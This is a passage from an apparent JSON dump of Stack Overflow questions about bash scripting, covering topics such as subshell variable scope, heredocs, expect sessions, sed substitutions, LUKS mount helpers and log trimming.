sum=`expr $sum + $val`\n        echo \"sum is now: $sum\"\ndone\n\necho \"FINAL SUM: $sum\"\n</code></pre>\n\n<p><strong>output from executing test.sh</strong></p>\n\n<pre><code>sum is now: 100\nsum is now: 300\nsum is now: 600\nFINAL SUM: 0\n</code></pre>\n\n<p>the final sum should be 600. What can I do to fix this?</p>\n"},{"tags":["mysql","bash","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12963155,"title":"Unexpected End of File in a Bash script?","body":"<p>This is just a little script to add a user to an e-mail MySQL database, assign an alias to him if an argument is defined, send a welcome email to the user and send e-mails to everybody else notifying about the newcomer. But everytime I try to run the script, I only get the message <code>UNEXPECTED END OF FILE</code>. Here's the script:</p>\n\n<pre><code>#! /bin/bash\n\nUSER=$1\nSECTOR=$2\n\nif [ -z \"${SECTOR}\" ];\nthen\n   mysql --host=localhost --user=verysecretdatabaseuser --password=verysecretdatabasepass mydatabase &lt;&lt; EOF\n   insert into users (email,name,uid,gid,homedir,maildir,crypt,force_change_pwd) values(\"${USER}@example.com.br\",\"${USER}\",1001,1001, \"/var/mail/${USER}/\",\"/var/mail/${USER}/.maildir/\",ENCRYPT(\"verysecretdefaultpass\"), \"yes\" );\n   EOF\nelse\n   mysql --host=localhost --user=verysecretdatabaseuser --password=verysecretdatabasepass mydatabase &lt;&lt; EOF\n   insert into users(email,name,uid,gid,homedir,maildir,crypt,force_change_pwd)  values(\"${USER}@example.com.br\",\"${USER}\",1001,1001,\"/var/mail/${USER}/\",\"/var/mail/${USER}/.maildir/\",ENCRYPT(\"verysecretdefaultpass\"), \"yes\" ); EOF\n   insert into alias(alias,destination) values (\"${SECTOR}@example.com.br\", \"${USER}@example.com.br\");\n   EOF\nfi\n\n# send e-mail so my postfix can create the mail directories \n/usr/sbin/sendmail -f me@example.com.br \"${USER}@example.com.br\" &lt;&lt; EOF\nSubject: Bem Vindo!\nSeja bem vindo ao Servidor de e-mails da Empresa! Com muito orgulho hospedamos nosso e-mail        em nosso próprio servidor. Em caso de dúvidas contacte &lt;me@example.com.br&gt;\n.\nEOF\n\n# fetching everyone already in the database\nusers=`mysql --user=myverysecretuser --password=myverysecretpass -s -N -e \"SELECT myverysecretfield FROM    myverysecretdatabase.myverysecretusertable\"`\n\n#sending an e-mail to each user\nfor user in $users\ndo\n   echo \"${user}\"\n   /usr/sbin/sendmail -f me@example.com.br \"${user}\" &lt;&lt; EOF\n   Subject: Funcionario novo!\n   Prezados, deem as boas vindas ao funcionario novo \"${USER}\" que acabou de entrar no  departamento de \"${SECTOR}\". Para se comunicar com o funcionario novo, basta enviar e-mails   para: \"${USER}@example.com.br\". O funcionario novo tambem recebera e-mails que forem   enviados para \"${SECTOR}@example.com.br\".\n   .\n   EOF\ndone\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["perl","bash","awk","pair"],"answer_count":7,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":189,"score":4,"question_id":12963783,"title":"Removing repeated pairs from a very big text file","body":"<p>I have a very big text file (few GB) that has the following format:</p>\n\n<pre><code>1 2\n3 4\n3 5\n3 6\n3 7\n3 8\n3 9\n</code></pre>\n\n<p>File is already sorted and double lines  were removed. There are repeated pairs like '2 1', '4 3' reverse  order that I want to remove. Does anybody have any solution to do it in a very resource limited environments, in BASH, AWK, perl or any similar languages?  I can not load the whole file and loop between the values.  </p>\n"},{"tags":["linux","bash","script","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12959748,"title":"bash return control to user from expect","body":"<p>I am writing a bash script with expect in it. </p>\n\n<pre><code>#!/bin/bash\nIP1=\"a.b.c.d\"\nIP2=\"e.f.g.h\"\nHOST=\"xyz.com\"\nKEY=\"/path/to/key/file\"\nPORT=\"sshport\"\n/usr/bin/expect &lt;&lt; EOD\n    spawn ssh -p $PORT -i $KEY $HOST\n    expect \"*#\"\n    send \"sh somescript\\r\"\n    expect \"Prompt from script:\"\n    send \"$IP1\\r\"\n    expect \"Second Prompt from script\"\n    send \"$IP2\\r\"\n    interact\n\nEOD\n</code></pre>\n\n<p>I am expecting to get the control back so that user can interact with the script after sending IP2 , but the script terminates, logs out of session from remote host. Any pointers  please ? </p>\n\n<p>Thank you \nAmit</p>\n"},{"tags":["bash","shell","script","compare","pattern-matching"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":143,"score":1,"question_id":12913742,"title":"Bash script to delete and match folder names to partial file names in different directories","body":"<p>[EDIT] Problem solved. Script updated below. Thanks to everyone for the help. Had a few mods i needed to do to make it all work with spaces in folder names and non empty folders.</p>\n\n<p>Really having a hard time with this one.</p>\n\n<p>When a file is downloaded, my system creates two things: </p>\n\n<ol>\n<li><p>a file (created in my \"Jobs\" directory), e.g.</p>\n\n<ul>\n<li>Johns.Pizza.Place.5489231.job</li>\n<li>Marks.Hair.Salon.NY.888.job</li>\n<li>Rachels.Bike.and.Boat.Shop.11122287865.job</li>\n</ul></li>\n<li><p>a folder with the name of the file (created in my \"Temp\" directory), e.g.</p>\n\n<ul>\n<li>Johns.Pizza.Place</li>\n<li>Marks.Hair.Salon.NY</li>\n<li>Rachels.Bike.and.Boat.Shop</li>\n</ul></li>\n</ol>\n\n<p>As you can see, the folder names always match part of the filenames but each file is always appended with a random number of length and then the extension (which is '.job'). </p>\n\n<p>What I want to do is be able to run a script that tries to </p>\n\n<ol>\n<li><p>Match the the folder names in the directory of files BUT is only doing a partial match since the files have both a random number and extension added, then </p></li>\n<li><p>Deletes those folders when it DOES NOT FIND an associated file (I am using Hazel to delete the files after certain actions). If a matching files is found for a folder, I don't want that folder deleted.</p></li>\n</ol>\n\n<p>Here is what I tried but I know it's incomplete. Obviously I'm trying to pull just folder name in path to match with partial filenames where I have removed the extension but I am not sure how to also remove the random number string.</p>\n\n<p>[EDIT]: Final working script below</p>\n\n<pre><code>#! /bin/sh\n\nMainDir=\"/Users/Dhy/Desktop/Temp Files/1. All Files/\"\nJobDir=\"/Users/Dhy/Documents/All Jobs/\"                             \n\nfind \"$MainDir\"* -maxdepth 0 -type d | while read FolderName; do\nSuffixName=$(basename \"${FolderName}\");\n    preserve=''\n    for file in \"$JobDir\"*.job; do\n        if [[ $file\\.[0-9]+ =~ $SuffixName ]]; then \n            preserve='on'\n        break \n        fi\n    done\n\n    if [ -z $preserve ]; then\n        rm -rf \"$MainDir$SuffixName\"\n    fi\ndone\n</code></pre>\n\n<p>Any help is greatly appreciated.</p>\n"},{"tags":["git","bash","bash-completion"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":972,"score":0,"question_id":11662735,"title":"Git completion and PS1 not working: \"__git_ps1: command not found\" on \"sudo -s\" or \"sudo su\" on Ubuntu 12.04","body":"<p>I installed git and git-flow completion adding these line to .bashrc of root and a normal_user on a Ubuntu 12.04 machine:</p>\n\n<pre><code>source /etc/git-completion.bash\nsource /etc/git-flow-completion.bash\nGIT_PS1_SHOWUPSTREAM=\"verbose\"\nGIT_PS1_SHOWDIRTYSTATE=true\nPS1='\\[\\033[32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[34m\\]\\w\\[\\033[31m\\]$(__git_ps1)\\[\\033[00m\\]\\$ '\n</code></pre>\n\n<p>When I log as root or normal_user git completion works. However if I use \"sudo -s\" or \"sudo su\" git completion is not working and I continually get \"__git_ps1: command not found\" each time I press return. \nI tried to remove the \"source\" commands and use \"apt-get install bash-completion\" (bash-completion was already installed). So even without the 2 source I get the exact same behavior. </p>\n\n<p>Anybody knows what the problem is and how to make it work?</p>\n"},{"tags":["linux","bash","shell","variables","scripting"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1940,"score":1,"question_id":10515964,"title":"Counter increment in Bash loop not working","body":"<p>I have the following simple script where I am running a loop and want to maintain a COUNTER. I unable to figure out why the counter is not updating. Is it due to subshell thats getting created? How can I potentially fix this</p>\n\n<pre><code>#!/bin/bash\nWFY_PATH=/var/log/nginx\nWFY_FILE=error.log\nCOUNTER=0\ngrep 'GET /log_' $WFY_PATH/$WFY_FILE | grep 'upstream timed out' | awk -F ', ' '{print $2,$4,$0}' | awk '{print \"http://domain.com\"$5\"&amp;ip=\"$2\"&amp;date=\"$7\"&amp;time=\"$8\"&amp;end=1\"}' | awk -F '&amp;end=1' '{print $1\"&amp;end=1\"}' |\n(\nwhile read WFY_URL\ndo\n    echo $WFY_URL #Some more action\n    COUNTER=$((COUNTER+1))\ndone\n)\n\necho $COUNTER # output = 0\n</code></pre>\n\n<p>Thanks\nSparsh</p>\n"},{"tags":["bash","ubuntu","reload"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":96,"score":1,"question_id":12933849,"title":"make a program reload an already opened file on file change","body":"<p>I need to play a <code>.swf</code> file then when the file is changed to reload the player with new content. Sadly, my program of choice does not do monitor files for changes. I came up with a bit convoluted solution:</p>\n\n<pre><code>sudo apt-get install incron gtk-gnash\necho \"my_username\" | sudo tee -a /etc/incron.allow # allow my_username to run incron\nincrontab -e\n</code></pre>\n\n<p>add the following to incrontab:</p>\n\n<pre><code>/home/my_username/path/myfile.swf IN_MODIFY /home/my_username/path/run.sh\n</code></pre>\n\n<p>and the <code>run.sh</code> contains: ( also <code>chmod 700 run.sh</code>)</p>\n\n<pre><code>#!/bin/sh\nkillall gtk-gnash\ngtk-gnash /home/my_username/path/myfile.swf\n</code></pre>\n\n<p>As you can see this is far from elegant. How else could I go about this?</p>\n\n<p>This is on Ubuntu 12.04 if that matters for you. This is a duplicate of my own <a href=\"http://askubuntu.com/questions/201708/swf-player-aware-of-file-changes/202040\">question</a> on askubuntu</p>\n\n<p><strong>EDIT:</strong> clarification, I chose to use gtk-gnash, a standalone player, this is not required, a web browser would do too but seems not necessary</p>\n"},{"tags":["bash","shell","ksh","zsh","sh"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":104,"score":4,"question_id":8122779,"title":"Is it necessary to specify traps other than EXIT?","body":"<p>I see a lot of shell scripts that do:</p>\n\n<pre>\ntrap cmd 0 1 2 3 13 15 # EXIT HUP INT QUIT PIPE TERM\n</pre>\n\n<p>In every shell I have access to at the moment, all the traps other than 0 are redundant, and cmd will be executed upon receipt of a signal if the trap is simply specified:</p>\n\n<pre>\ntrap cmd 0\n</pre>\n\n<p>Is the latter specification sufficient, or do some shells require the other signals to be specified?</p>\n"},{"tags":["bash","mount"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12952686,"title":"How to modify the /etc/mtab entry created by a custom mount helper such that a custom `umount` is used?","body":"<p>In response to my question <a href=\"http://unix.stackexchange.com/q/52078/863\">How to mount a cryptsetup container just with <code>mount</code>?</a> over at unix.SE, I realized that <code>mount -t luks</code> will call the script <code>mount.luks</code>, which currently looks like this:</p>\n\n<pre><code>#!/bin/bash\nset -e\nMAPPER=$(mktemp -up /dev/mapper)\ncryptsetup luksOpen $1 $(basename $MAPPER)\nshift\nmount $MAPPER $* || cryptsetup luksClose $(basename $MAPPER)\n</code></pre>\n\n<p>That is, it determines an unused mapper name that <a href=\"https://code.google.com/p/cryptsetup/\" rel=\"nofollow\">cryptsetup</a> can use to mount a LUKS/dm-crypt encrypted device (I know the <code>$*</code> is dangerously prone to recursion if subtypes are involved, consider this a prototype) after decrypting it (after prompting for the passphrase).</p>\n\n<p>The problem is, the resulting entry of <code>mount -t luks /dev/hda /mnt/decrypted</code> in <code>/etc/mtab</code> will look something like</p>\n\n<pre><code>/dev/mapper/tmp.mpI5ClExf8 on /mnt/decrypted type ext3 (rw,relatime,errors=continue,data=writeback)\n</code></pre>\n\n<p>such that <code>umount /dev/hda</code> will fail and <code>umount /mnt/decrypted</code> will only unmount the mapper but leave the encrypted device open. The mapper is also rather irrelevant. What I'd like to achieve is having an entry à la</p>\n\n<pre><code>/dev/hda on /mnt/decrypted type luks.ext3 (rw,relatime,errors=continue,data=writeback,mapper=/dev/mapper/tmp.mpI5ClExf8)\n</code></pre>\n\n<p>such that <code>umount</code> will call <code>umount.luks</code>, which may be something like</p>\n\n<pre><code>#!/bin/bash\nset -e\numount $1\ncryptsetup luksClose $MAPPER\n</code></pre>\n\n<p>(Again, prototype, this would only treat the <code>umount /mnt/decrypted</code> call correctly and <code>MAPPER</code> needs to be obtained from the mount option)</p>\n\n<p>So, how does <code>mount.luks</code> have to be modified? Directly modifying <code>/etc/mtab</code> is certainly a bad idea. (Can e.g. <code>mount -n</code> and <code>mount -f</code> achieve this somehow?)</p>\n"},{"tags":["bash","windows-7","ssh","cygwin"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":132,"score":1,"question_id":12206190,"title":"cygwin ssh shortcut from windows desktop","body":"<p>I have multiple servers that I need to remote into.\nI prefer Cygwin over Putty to do so.</p>\n\n<p>Anyhows - the process of opening my cool Mintty window and then typing the following commands takes too long.\nPS - I am using a \"key\" authentication to these servers.</p>\n\n<p>First, I double Click Cygwin Terminal shortcut from my windows desktop.</p>\n\n<p>Then once the terminal session has booted up, from the command prompt I type the following -</p>\n\n<pre><code>$ eval `ssh-agent`\n$ ssh-add\n$ ssh &lt;username&gt;@&lt;servername&gt;\n</code></pre>\n\n<p>Please keep in mind that my 'servername' is variable.  In fact I have about 10 different server names that could potentially be inserted there - Hence my need for 10 different shortcuts.  I would prefer to double click on something from my desktop that will fire up my Mintty and automatically execute the above bash shell commands.</p>\n\n<p>Does anyone have or can recommend a nice/elegant solution to do this?</p>\n\n<p>(I have a feeling that it has something to do with the Target attribute of the Windows short-cut icon that I am clicking on.)</p>\n"},{"tags":["regex","bash","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":561,"score":0,"question_id":7870264,"title":"Bash to find lines with exact one word?","body":"<p>I'm trying to write a bash script that takes a file name, and return lines that have one word. Here is sample text:</p>\n\n<pre><code>This has more than one word\nThere\nis exactly one word in above line.\n         White-space\nin the start of the above line doesn't matter.\nNeed-some-help.\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>There\n         White-space\nNeed-some-help.\n</code></pre>\n\n<p>I'm looking into using a combination SED and Regex.</p>\n\n<p>Note: I cannot using anything else (it has to be a bash script, without custom modules), so suggesting that wouldn't help.</p>\n"},{"tags":["python","bash","ssh","paramiko"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12960647,"title":"nested terminal sessions using paramiko ssh client","body":"<p>How to properly handle situation when user wants to start over ssh new terminal session - executing <code>exec_command('bash')</code>. Currently while doing it this way, function hangs out.</p>\n"},{"tags":["bash","terminal"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12958811,"title":"Copy text from one line and create a new line with that next under it","body":"<p>I have a text file in which I want to find all of ID:= \"abc123\" when it finds that I want it to take that value of abc123 and create a new line and have a set string, newId:= \"abc123 How can I do this within terminal?</p>\n\n<p>I'd like to use bash, below are some examples, find the string '\"ID\": \", copy the value (abc123) and make a new line with this data.</p>\n\n<pre><code>\"ID\": \"abc123\"\n\"newID\": \"abc123\"\n</code></pre>\n"},{"tags":["bash","script"],"answer_count":4,"favorite_count":0,"up_vote_count":10,"down_vote_count":1,"view_count":12127,"score":9,"question_id":6348902,"title":"How can I add numbers in a bash script","body":"<p>I have this bash script and I had a problem in line 16.\nHow can I take the previous result of line 15 and add\nit to the variable in line 16?</p>\n\n<pre><code>#!/bin/bash\n\nnum=0\nmetab=0\n\nfor ((i=1; i&lt;=2; i++)); do      \n    for j in `ls output-$i-*`; do\n        echo \"$j\"\n\n        metab=$(cat $j|grep EndBuffer|awk '{sum+=$2} END { print sum/120}') (line15)\n        num= $num + $metab   (line16)\n    done\n    echo \"$num\"\n done\n</code></pre>\n"},{"tags":["bash","awk","grep","less"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12958313,"title":"Is it possible to output the contents of more than one stream into separate columns in the terminal?","body":"<p>For work, I occasionally need to monitor the output logs of services I create. These logs are short lived, and contain a lot of information that I don't necessarily need.  Up until this point I've been watching them using:</p>\n\n<pre><code>grep &lt;tag&gt; * | less\n</code></pre>\n\n<p>where <code>&lt;tag&gt;</code> is either INFO, DEBUG, WARN, or ERROR. There are about 10x as many warns as there are errors, and 10x as many debugs as warns, and so forth. It makes it difficult to catch one ERROR in a sea of relevant DEBUG messages. I would like a way to, for instance, make all 'WARN' messages appear on the left-hand side of the terminal, and all the 'ERROR' messages appear on the right-hand side.</p>\n\n<p>I have tried using tmux and screen, but it doesn't seem to be working on my dev machine.</p>\n"},{"tags":["bash","perl","unix","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":162,"score":2,"question_id":12606996,"title":"Webpage to take input from shell script and display result","body":"<p>I am newbie to web programming and I have small shell script which basically gives output with two results. It's basically to find users on our directory.</p>\n\n<pre><code>#!/bin/bash\necho -n \"Please enter username to lookup: \"\nread USERNAME\nDISPLAYNAME=`ldapsearch -p xxx -LLL -x -w test -h abc.com -D abc -b dc=abc,dc=com sAMAccountName=$USERNAME | grep displayName`\n\nif [ -z \"$DISPLAYNAME\" ]; then\n  echo \"No entry found for $USERNAME\"\nelse \n  echo \"Entry found for $USERNAME\"\nfi\n</code></pre>\n\n<p>Looking out for perl web code which can display the results on browser.</p>\n\n<p>I know, I would be asking too much here, but I would really appreciate if anyone can give me right direction to achieve this.</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","shell","unix","awk","aix"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":86,"score":0,"question_id":12938508,"title":"How to find every number in a row and store average in separate per-row variable","body":"<p>I just started learning shell scripting.</p>\n\n<p>I'm trying to read from a file structured like:</p>\n\n<pre><code>harddrive1 10 20 30 40\nharddrive2 20 30 40 50\nharddrive3 30 40 50 60\n</code></pre>\n\n<p>I want to save the average of each row in a separate variable somehow...there will only be 3 rows, 5 columns.\nSo my output would be:</p>\n\n<pre><code>hd_AVG1=20\nhd_AVG2=35\nhd_AVG3=45\n</code></pre>\n\n<p>How can I accomplish that?</p>\n\n<p>EDIT: I need to save it in DIFFERENT variable so that i can call the variable...for example </p>\n\n<pre><code>if [[ $hd_AVG1 -eq 20 ]];\n    then \n    do something...\nelif [[ $hd_AVG2 -gt 40 ]];\n    then\n    do something...\nfi\n</code></pre>\n"},{"tags":["bash","shell","unix","script","output"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12957942,"title":"Output the Names of Copied Files in Shell Script","body":"<p>I am working on a bash script to copy configuration files to their appropriate directories. I would like to output the name of the file that I have copied to the user. Here is what I have so far:</p>\n\n<pre><code>CONFIG_DIR=\"/home/stackoverflow/app/configs\"\nCONFIG_FILE=\"*.config\"\n\ncp $CONFIG_FILE $CONFIG_DIR\n\necho \"$CONFIG_FILE was copied to $CONFIG_DIR\"\n</code></pre>\n\n<p>The output I get from this is: </p>\n\n<pre><code>*.config was copied to /home/stackoverflow/app/configs\n</code></pre>\n\n<p>Let's assume that stackoverflow.config is the only .config file present in the directory where the script is running. I would like it to say:</p>\n\n<pre><code>stackoverflow.config was copied to /home/stackoverflow/app/configs\n</code></pre>\n"},{"tags":["bash"],"answer_count":9,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":4675,"score":3,"question_id":320313,"title":"echo \"-e\" doesn't print anything","body":"<p>I'm using GNU bash, version 3.00.15(1)-release (x86_64-redhat-linux-gnu). And this command:</p>\n\n<pre><code>echo \"-e\"\n</code></pre>\n\n<p>doesn't print anything. I guess this is because \"-e\" is one of a valid options of echo command because echo \"-n\" and echo \"-E\" (the other two options) also produce empty strings.</p>\n\n<p>The question is how to escape the sequence \"-e\" for echo to get the natural output (\"-e\").</p>\n"},{"tags":["bash","sed","autohotkey","dvorak"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12955440,"title":"What is the variable that stores the whole line matching the pattern in sed?","body":"<p>I have a file whose lines are Italian words that end in <code>[aiou]'</code></p>\n\n<pre><code>gia'\ngiacche'\ngiovedi'\ngiu'\n</code></pre>\n\n<p>I want to replace these lines with the autohotkey commands that would allow me to write these words with an apostrophe and automatically translate them in their correct versions, that is i want to get</p>\n\n<pre><code>::gia'::già\n::giacche'::giacché\n::giovedi'::giovedì\n::giu'::giù\n</code></pre>\n\n<p>I know I can accomplish this with sed, but I couldn't get it to work. I know there is a variable to store the whole line, but I can't find it. If it were <code>@</code> the following might work</p>\n\n<pre><code>sed -e \"s/.a'/::@::@\\b\\bà/\" temp\nsed -e \"s/.i'/::@::@\\b\\bì/\" temp\nsed -e \"s/.o'/::@::@\\b\\bò/\" temp\nsed -e \"s/.u'/::@::@\\b\\bù/\" temp\n</code></pre>\n\n<p>Please note that while the lines are in alphabetical order they DO NOT all start in g, nor there is a pattern in the last two characters of the word.</p>\n\n<p>So do you know what is the variable I'm looking for?\nDo you think there is a better solution to my problem than the one I'm trying?</p>\n"},{"tags":["bash","svn","svn-hooks"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":285,"score":1,"question_id":6394998,"title":"Getting project name in post-commit subversion hook","body":"<p>I have a subversion repository laid out like this:</p>\n\n<pre><code>Repo\n    ProjectA\n        trunk\n        branches\n        tags\n    ProjectB\n        trunk\n        branches\n        tags\n</code></pre>\n\n<p>I'm trying to write a post-commit hook script that just applies to one project, but I just learned that they are housed at the root of the repository.</p>\n\n<p>The only two parameters I get are the Repository path and Revision number.  Is there any way for me to execute this script for just a particular project?</p>\n\n<p>Thanks,</p>\n\n<p><strong>Solution:</strong>\nUltimate solution went something like this:</p>\n\n<pre><code>#!/bin/bash\nREPOS=\"$1\"\nREV=\"$2\"\nif svnlook changed -r $REV $REPOS | grep ProjectA; then\n    echo \"do stuff\"\nfi\n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":84,"score":6,"question_id":12945987,"title":"recursively rename directories in bash","body":"<p>I'd like to recursively rename all directories containing the string <em>foo</em> by replacing that part of the string with <em>Bar</em>.  I've got something like this so far, but it doesn't quite work.  I'd also like <em>foo</em> to be searched <strong>case-insensitive</strong>.</p>\n\n<p><code>find . -type d -exec bash -c 'mv \"$1\" \"${1//foo/Bar}\"' -- {} \\;</code></p>\n\n<p>Are there any elegant one-liners that might be better than this attempt?  I've actually tried a few but thought I'd defer to the experts.  Note: i'm doing this on a Mac OS X system, and don't have tools like <strong>rename</strong> installed.</p>\n"},{"tags":["python","performance","bash","sed","logging"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":372,"score":5,"question_id":9653507,"title":"trim big log file","body":"<p>i perform performance tests for a few java applications. Applications produce very big log files( it can be 7-10 GB) during the test . I need to trim these log files between specific dates and time. currently, i use python script, which parses log timestamps in datetime python object and print only matched strings. But this solution is very slow. 5 GB log is parsed about 25 minutes\nObviously entries in log file is sequentially and i don't need to read all file line by line. \nI thought about reading file from the start and from the end, until condition is matched and print files between matched number of lines. But i don't know how can i read file from the backwards, without downloading it to the memory.</p>\n\n<p>Please, can you suggest me any suitibale solution for this case.</p>\n\n<p>here is part of python script:</p>\n\n<pre><code>      lfmt = '%Y-%m-%d %H:%M:%S'\n      file = open(filename, 'rU')\n      normal_line = ''\n      for line in file:\n        if line[0] == '[':\n          ltimestamp = datetime.strptime(line[1:20], lfmt)\n\n          if ltimestamp &gt;= str and ltimestamp &lt;= end:\n            normal_line = 'True'\n        else:\n          normal_line = ''\n\n      if normal_line:\n        print line,\n</code></pre>\n"},{"tags":["bash","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12948181,"title":"How to use awk to parse values from stdout as elements of an array?","body":"<p>The command <code>elb-describe-instance-health</code> returns the following</p>\n\n<pre><code>INSTANCE_ID  i-111\nINSTANCE_ID  i-222\nINSTANCE_ID  i-333\n</code></pre>\n\n<p><code>$(elb-describe-instance-health | awk '/INSTANCE_ID/{print $2}')</code></p>\n\n<p>returns <code>i-111 i-222 i-3333</code></p>\n\n<p>How can I change the above syntax to store each of these values in an array (ex. <code>foo[0]</code> equals <code>i-111</code>, <code>foo[1]</code> equals <code>i-222</code>, <code>foo[2]</code> equals <code>i-333</code>?</p>\n"},{"tags":["bash","shell","variables","redirect","script"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12944821,"title":"How to assign redirection symbol to a variable for assembling a command line","body":"<p>I have a couple of BASH scripts that launch programs I commonly use with common arguments using variables for the command and arguments. The invocation appears at the end like so:</p>\n\n<pre><code>$PROGRAM $ARG1 $ARG2 &amp;\n</code></pre>\n\n<p>Now I want to redirect output to stderr and stdout to <code>/dev/null</code> by default. I want to be able to disable that with a switch to the script (<code>-v</code> = verbose). But if I try to assign <code>\"2&gt;&amp;1 &gt; /dev/null\"</code> to a var, say <code>REDIRECTION</code>, (clearing it if verbose is specified) and try to invoke like so:</p>\n\n<pre><code>$PROGRAM $ARG1 $ARG2 $REDIRECTION &amp;\n</code></pre>\n\n<p>The redirection directives are passed as arguments to the program. Is there a way to do this? Or do I have to use my solution which is to have 2 separate invocation lines, one with and one without the redirection directives, depending on \"verbosity\"? </p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12952427,"title":"bash test for number in range (with float numbers)","body":"<p>the problem is in this line </p>\n\n<pre><code>elif [  \"$(echo $a '&gt;' $v06 | bc -l)\"  -eq 1  &amp;&amp;   \"$(echo $a '&lt;' $v08 | bc -l)\" -eq 1  ];then\n</code></pre>\n\n<p>How can I test if the number is in range ?\nI know that there might be other solution for this but I want to solve in this way with bc...</p>\n\n<pre><code>a=0.1\nv06=0.6\nv08=0.8\n\nif [ \"$(echo $a '&lt;' $v06 | bc -l)\" -eq 1 ];then\n    echo \" &lt;0.6\"\nelif [  \"$(echo $a '&gt;' $v06 | bc -l)\"  -eq 1  &amp;&amp;   \"$(echo $a '&lt;' $v08 | bc -l)\" -eq 1  ];then\n    echo \" &lt;0.6 &gt;0.8\"\nelse\n    echo \"&gt;1.5\"\nfi\n</code></pre>\n"},{"tags":["bash","autocomplete","bash-completion"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12933362,"title":"Getting compgen to include slashes on directories when looking for files","body":"<p>I'd like to get the following behavior from my custom completion</p>\n\n<p>Given</p>\n\n<pre><code>$ mkdir foo\n$ touch faz foo/bar foo/baz\n</code></pre>\n\n<p>I'd like to get this</p>\n\n<pre><code>$ foo -u &lt;tab&gt;&lt;tab&gt; =&gt;\nfoo faz/\n\n$ foo -u fa&lt;tab&gt;&lt;tab&gt; =&gt;\n$ foo -u faz/\n\n$ foo -u faz/&lt;tab&gt;&lt;tab&gt; =&gt;\nbar baz\n</code></pre>\n\n<p>I assumed that <code>compgen -f f</code> would output <code>foo faz/</code>, but it outputs <code>foo faz</code> which doesn't help me much.</p>\n\n<p>Do I need to post-process the output or is there some magic combination of options to compgen that work?</p>\n"},{"tags":["bash","input","clear"],"answer_count":7,"favorite_count":3,"up_vote_count":9,"down_vote_count":0,"view_count":2490,"score":9,"question_id":1056394,"title":"In bash, how does one clear the current input?","body":"<p>Suppose in bash you start writing a command like:</p>\n\n<pre><code>$ rm -rf /foo/bar/really/long/path/here\n</code></pre>\n\n<p>and then realize you don't want to execute this after all.  Is there a way to clear the input with one or two keystrokes?</p>\n\n<p>What I have been doing lately is prepending echo and enclosing the input in quotes (Ctrl+A, <code>echo \"</code>, Ctrl+E, <code>\"</code>) then hitting enter.  Is there a faster way?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12951301,"title":"How to get the return type of the timed command?","body":"<p>I'm trying to use the bash builtin <code>time</code> to measure how long the execution of a command takes. </p>\n\n<p>The problem is getting the return code from the timed command. After looking into</p>\n\n<pre><code>help time\n</code></pre>\n\n<p>it seems that time always return 0 and not the return code of the executed command. Is there some way to get the return status of the timed command?</p>\n"},{"tags":["bash","path","find","case"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11862746,"title":"Find path in bash on insensitive manner","body":"<p>Suppose a path like </p>\n\n<pre><code>/home/nenopera/Projects/InSaNEWEBproJECT\n</code></pre>\n\n<p>Despite of the fact to not use such that names. Is there a way to check for a path in an insensitive manner?</p>\n\n<p>I came across to this solution, but I would like to find a builtin or gnu program, if it is possible.</p>\n\n<pre><code>function searchPathInsensitive {\n # Replace bar with comma (not valid directory character allowing parse dirs with spaces)\n #also remove first / if exist (if not this create a first empty element\n\n ORG=\"$1\"\n if [ \"${ORG:0:1}\" = \"/\" ]\n then\n  ORG=\"${ORG:1}\"\n else\n  ORG=\"${PWD:1}/$ORG\"\n fi\n OLDIFS=$IF\n IFS=,\n for dir in ${ORG//\\//,}\n do\n  if [ -z $DIR ]\n  then\n   DIR=\"/$dir\"\n  else\n   TMP_DIR=\"$DIR/$dir\"\n   DIR=$(/usr/bin/find $DIR -maxdepth 1 -ipath $TMP_DIR -print -quit)\n   if [ -z $DIR ]\n   then\n    # If some of the path does not exist just copy the element\n    # exit 1        \n    